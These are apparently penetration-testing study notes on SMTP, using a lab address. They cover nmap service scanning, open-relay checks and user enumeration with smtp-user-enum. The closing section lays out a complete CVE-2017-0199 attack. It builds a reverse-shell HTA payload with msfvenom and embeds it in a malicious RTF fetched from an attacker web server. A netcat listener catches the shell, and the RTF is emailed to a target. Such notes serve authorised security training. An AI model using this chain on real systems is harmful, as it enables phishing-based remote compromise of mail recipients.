# Simple Mail Transfer Protocol

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Footprinting The Service

### **Nmap**

{% code overflow="wrap" %}
```
sudo nmap 10.129.14.128 -sC -sV -p25
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Nmap - Open Relay**

{% code overflow="wrap" %}
```
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Enumerate users

Response codes from smtp servers may vary example code 250 & 252 is considered a valid user and smtp-user-enum checks only for 250

Without Domain

```
smtp-user-enum -M VRFY -U wordlist -t IP
```

With Domain

```
smtp-user-enum -M VRFY -U wordlist -t IP -d example.com
```

#### [RTF Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)

1. msfvenom -p windows/shell\_reverse\_tcp LHOST=local-IP LPORT=443 -f hta-psh -o msfv.hta
2. python2 cve-2017-0199\_toolkit.py -M gen -t RTF -w MailFile.RTF -u http://local-WebServIP:Port/msfv.hta
3. python2 -m SimpleHTTPServer 80
4. nc -lnvp 443
5. sendEmail -f FromEmail@example.com -t ToEmail@example.com -u "Subject" -m "Message" -a MailFile.RTF -s TargetIP -v
